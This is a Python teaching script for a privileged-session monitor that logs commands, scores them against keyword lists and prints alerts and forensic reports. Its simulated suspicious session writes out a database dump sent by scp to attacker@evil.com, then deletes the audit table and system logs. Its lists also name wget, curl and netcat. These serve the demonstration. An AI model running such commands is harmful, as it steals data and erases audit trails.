#!/usr/bin/env python3
"""
Session Monitor
===============
Records and analyzes privileged sessions:
- Command logging with timestamps
- Real-time anomaly detection
- Session playback for forensics
- Alerting on suspicious commands

Run: python session_monitor.py
"""

import time
from datetime import datetime, timedelta
from typing import Dict, List
from dataclasses import dataclass, field


@dataclass
class SessionEvent:
    timestamp: float
    command: str
    resource: str
    risk_level: str  # low, medium, high, critical


class PrivilegedSession:
    def __init__(self, session_id: str, user: str, role: str):
        self.session_id = session_id
        self.user = user
        self.role = role
        self.start_time = time.time()
        self.events: List[SessionEvent] = []
        self.is_active = True
    
    def log_command(self, command: str, resource: str):
        """Log a command and assess its risk."""
        risk = self._assess_risk(command)
        event = SessionEvent(
            timestamp=time.time(),
            command=command,
            resource=resource,
            risk_level=risk
        )
        self.events.append(event)
        
        if risk in ["high", "critical"]:
            print(f"   🚨 ALERT: {self.user} ran '{command}' on {resource} (Risk: {risk})")
        
        return event
    
    def _assess_risk(self, command: str) -> str:
        """Assess risk level of a command."""
        critical_cmds = ["rm -rf", "drop database", "delete", "format", "shutdown"]
        high_cmds = ["sudo", "chmod 777", "passwd", "useradd", "usermod"]
        medium_cmds = ["scp", "wget", "curl", "netcat", "ssh"]
        
        cmd_lower = command.lower()
        
        for cmd in critical_cmds:
            if cmd in cmd_lower:
                return "critical"
        
        for cmd in high_cmds:
            if cmd in cmd_lower:
                return "high"
        
        for cmd in medium_cmds:
            if cmd in cmd_lower:
                return "medium"
        
        return "low"
    
    def end(self):
        self.is_active = False
        self.end_time = time.time()
    
    def generate_report(self) -> Dict:
        """Generate session forensics report."""
        risk_counts = {"low": 0, "medium": 0, "high": 0, "critical": 0}
        for event in self.events:
            risk_counts[event.risk_level] += 1
        
        duration = getattr(self, 'end_time', time.time()) - self.start_time
        
        return {
            "session_id": self.session_id,
            "user": self.user,
            "role": self.role,
            "duration_seconds": duration,
            "commands_executed": len(self.events),
            "risk_breakdown": risk_counts,
            "highest_risk": max(risk_counts, key=risk_counts.get),
            "anomaly_score": risk_counts["high"] * 2 + risk_counts["critical"] * 5
        }
    
    def playback(self):
        """Replay session for forensics."""
        print(f"\n📹 SESSION PLAYBACK: {self.session_id}")
        print(f"   User: {self.user} ({self.role})")
        print(f"   Started: {datetime.fromtimestamp(self.start_time)}")
        print("   " + "-" * 50)
        
        for event in self.events:
            ts = datetime.fromtimestamp(event.timestamp).strftime("%H:%M:%S")
            icon = {"low": "🟢", "medium": "🟡", "high": "🟠", "critical": "🔴"}[event.risk_level]
            print(f"   {icon} [{ts}] {event.command} on {event.resource}")


class SessionMonitor:
    def __init__(self):
        self.sessions: Dict[str, PrivilegedSession] = {}
        self.alerts: List[Dict] = []
    
    def start_session(self, user: str, role: str) -> PrivilegedSession:
        session_id = f"sess_{int(time.time())}_{user}"
        session = PrivilegedSession(session_id, user, role)
        self.sessions[session_id] = session
        print(f"\n🔓 Started privileged session: {session_id}")
        print(f"   User: {user}, Role: {role}")
        return session
    
    def end_session(self, session_id: str):
        if session_id in self.sessions:
            self.sessions[session_id].end()
            print(f"\n🔒 Ended session: {session_id}")
    
    def generate_forensics_report(self, session_id: str):
        if session_id not in self.sessions:
            print("Session not found")
            return
        
        session = self.sessions[session_id]
        report = session.generate_report()
        
        print(f"\n📊 FORENSICS REPORT: {session_id}")
        print("=" * 60)
        for key, value in report.items():
            print(f"   {key}: {value}")
        
        if report["anomaly_score"] > 3:
            print(f"\n   ⚠️  ANOMALY DETECTED: High-risk activity in session")
        
        return report


def main():
    print("=" * 60)
    print("📹 SESSION MONITOR")
    print("=" * 60)
    
    monitor = SessionMonitor()
    
    # Simulate admin session
    print("\n👤 Scenario 1: Normal admin maintenance")
    session1 = monitor.start_session("alice", "System Admin")
    session1.log_command("ls /var/log", "prod-server-01")
    session1.log_command("cat /var/log/syslog", "prod-server-01")
    session1.log_command("systemctl status nginx", "prod-server-01")
    session1.log_command("df -h", "prod-server-01")
    session1.playback()
    monitor.end_session(session1.session_id)
    monitor.generate_forensics_report(session1.session_id)
    
    # Simulate suspicious session
    print("\n" + "=" * 60)
    print("👤 Scenario 2: Suspicious activity detected")
    session2 = monitor.start_session("eve", "Database Admin")
    session2.log_command("SELECT * FROM users", "prod-db")
    session2.log_command("mysqldump --all-databases > backup.sql", "prod-db")
    session2.log_command("scp backup.sql attacker@evil.com:/data", "prod-db")
    session2.log_command("DROP TABLE audit_log", "prod-db")
    session2.log_command("rm -rf /var/log/*", "prod-server-01")
    
    session2.playback()
    monitor.end_session(session2.session_id)
    monitor.generate_forensics_report(session2.session_id)
    
    print("\n💡 KEY TAKEAWAYS:")
    print("   • Every privileged command is logged")
    print("   • Risk assessment happens in real-time")
    print("   • Anomalies trigger immediate alerts")
    print("   • Session playback enables forensic investigation")
    print("   • Commands like 'rm -rf' and 'DROP' are flagged as critical")


if __name__ == "__main__":
    main()
